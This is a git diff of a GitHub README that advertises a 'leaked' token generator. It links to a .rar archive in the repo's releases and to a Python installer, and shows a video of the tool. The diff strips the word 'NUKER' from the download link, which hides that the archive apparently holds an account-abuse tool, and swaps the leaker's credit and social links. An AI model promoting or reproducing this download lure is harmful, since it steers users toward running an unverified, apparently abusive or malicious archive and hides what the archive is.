@@ -6,16 +6,16 @@
 <p align="center">
 <a href="https://streamable.com/x5c89z">THEIR TOKEN GENERATOR SHOWCASE</a>
 <p align="center">
-<a href="https://github.com/celgz/999-shop-token-gen/releases/download/Release/999shop-token-gen.rar">PRESS TO DOWNLOAD NUKER</a>
+<a href="https://github.com/celgz/999-shop-token-gen/releases/download/Release/999shop-token-gen.rar">PRESS TO DOWNLOAD</a>
 <p align="center">
 <a href="https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe">DOWNLOAD PYTHON</a>ㅤㅤ 
 </p>
 <p align="center">
- LEAKED BY CEL:
-<a href="https://wanted.lol/cel">MY SOCIALS</a>
+ LEAKED BY @LAW:
+<a href="https://guns.lol/law">MY SOCIALS</a>
 </p>
 <h3 align="center">
-Please ⭐ This Repo If You Like It!
+Star⭐ This Repo If You Like It!
 </h3>
  
 ---
